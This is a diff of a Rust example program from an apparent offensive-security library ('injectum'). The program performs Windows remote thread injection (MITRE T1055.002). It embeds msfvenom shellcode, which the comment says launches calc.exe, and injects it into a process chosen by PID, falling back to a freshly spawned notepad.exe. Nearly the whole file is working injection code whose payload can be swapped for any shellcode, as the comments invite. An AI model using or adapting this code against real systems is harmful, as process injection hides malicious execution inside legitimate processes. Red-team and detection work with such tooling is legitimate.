@@ -1,42 +1,49 @@
 //! Example: T1055.002 - Remote Thread Injection
 //!
-//! ## Requirements
-//! - **Operating System**: Windows
-//! - **Features**: This example requires the `T1055_002` feature to be enabled.
-//!
-//! ## Build
-//! You can build this example with the following command:
+//! Build:
 //! ```sh
 //! cargo build --package injectum --example T1055_002_Remote_Thread --features "tracing,T1055_002" --release
 //! ```
 //!
-//! ## Usage
+//! Usage:
 //! ```sh
-//! ./T1055_002_Remote_Thread.exe <PID>
+//! ./T1055_002_Remote_Thread.exe [PID]
 //! ```
-
-use injectum::{
-    InjectorBuilder, InjectumError, Payload, PayloadMetadata, StrategyType, Target, Technique,
-};
-use std::env::args;
-
-#[cfg(feature = "tracing")]
-use tracing::{error, info};
+//!
+//! If PID is missing, a new 'notepad.exe' process will be spawned and targeted.
 
 #[cfg(not(feature = "tracing"))]
 mod logs {
     #[macro_export]
-    macro_rules! info {
-        ($($arg:tt)*) => {};
+    macro_rules! error {
+        ($($arg:tt)*) => {
+            let _ = format_args!($($arg)*);
+        };
     }
     #[macro_export]
-    macro_rules! error {
-        ($($arg:tt)*) => {};
+    macro_rules! info {
+        ($($arg:tt)*) => {
+            let _ = format_args!($($arg)*);
+        };
+    }
+    #[macro_export]
+    macro_rules! warn {
+        ($($arg:tt)*) => {
+            let _ = format_args!($($arg)*);
+        };
     }
 }
 
+use injectum::{
+    Error, InjectorBuilder, Payload, PayloadMetadata, Result, Target, Technique,
+    method::PortableExecutable,
+};
+use std::{env::args, process::Command};
+#[cfg(feature = "tracing")]
+use tracing::{error, info, warn};
+
+// Don't trust me, generate your own payloads!
 // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
-// But don't trust me, generate your payload! :)
 const SHELLCODE: &[u8] = &[
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
     0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
@@ -58,85 +65,67 @@ const SHELLCODE: &[u8] = &[
     0x65, 0x78, 0x65, 0x00,
 ];
 
-/// Program entry point.
 fn main() {
     if let Err(e) = run() {
         error!("{}", e);
     }
 }
 
-/// Orchestrates the injection workflow.
-fn run() -> Result<(), InjectumError> {
+fn run() -> Result<()> {
     setup_logging();
-
-    let pid = parse_args()?;
-
+    let process_id = parse_args()?;
     info!("------------------------------------------------");
-    info!("Target Process ID : {}", pid);
-    info!("Shellcode Source  : Embedded Static Bytes");
-    info!("Technique         : T1055.002 (RemoteThreadInjection)");
+    info!("Target Process ID : {}", process_id);
+    info!("Technique         : T1055.002 (RemoteThread)");
     info!("------------------------------------------------");
-
-    inject_shellcode(pid)?;
-
-    info!("Injection completed successfully.");
+    inject_shellcode(process_id)?;
+    info!("Injection completed.");
     Ok(())
 }
 
 /// Performs the Shellcode injection using Injectum.
-fn inject_shellcode(pid: u32) -> Result<(), InjectumError> {
+fn inject_shellcode(process_id: u32) -> Result<()> {
     let payload = Payload::Shellcode {
         bytes: SHELLCODE.to_vec(),
-        meta: PayloadMetadata {
-            description: Some("Embedded Example Shellcode".into()),
-            safe_sample: true,
-            ..Default::default()
-        },
+        metadata: PayloadMetadata::default(),
     };
-
-    let target = Target::Pid(pid);
-    let strategy = StrategyType::new(Technique::T1055_002, Some("RemoteThreadInjection"));
-
+    let technique = Technique::T1055_002(PortableExecutable::RemoteThread);
     InjectorBuilder::new()
-        .target(target)
-        .strategy(strategy)
+        .target(Target::Pid(process_id))
+        .technique(technique)
         .payload(payload)
         .execute()
 }
 
 /// Parses CLI arguments and validates the PID.
-fn parse_args() -> Result<u32, InjectumError> {
-    let args: Vec<String> = args().collect();
-
-    if args.len() < 2 {
-        print_usage();
-        return Err(InjectumError::Argument(
-            "Missing required arguments.".into(),
-        ));
+fn parse_args() -> Result<u32> {
+    let cli_args: Vec<String> = args().collect();
+    if cli_args.len() > 1 {
+        cli_args[1].parse::<u32>().map_err(|_| {
+            Error::Validation(format!(
+                "Invalid PID '{}'. Must be a positive integer.",
+                cli_args[1]
+            ))
+        })
+    } else {
+        warn!("No PID provided. Spawning 'notepad.exe' as a target...");
+        let child_process = Command::new("notepad.exe")
+            .spawn()
+            .map_err(|e| Error::Validation(format!("Failed to spawn dummy target: {}", e)))?;
+        Ok(child_process.id())
     }
-
-    let pid = args[1].parse::<u32>().map_err(|_| {
-        InjectumError::Argument(format!(
-            "Invalid PID '{}'. Must be a positive integer.",
-            args[1]
-        ))
-    })?;
-
-    Ok(pid)
 }
 
 fn setup_logging() {
     #[cfg(feature = "tracing")]
     {
-        // Initialize logging with a default of "info" if RUST_LOG is not set
-        let filter = tracing_subscriber::EnvFilter::try_from_default_env()
-            .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info"));
-
-        let _ = tracing_subscriber::fmt().with_env_filter(filter).try_init();
+        use tracing_subscriber::EnvFilter;
+        let _ = tracing_subscriber::fmt()
+            .with_target(true)
+            .with_env_filter(
+                EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
+            )
+            .without_time()
+            .try_init();
     }
-}
-
-fn print_usage() {
-    println!("Usage:");
-    println!("  T1055_002_Remote_Thread.exe <PID>");
 }
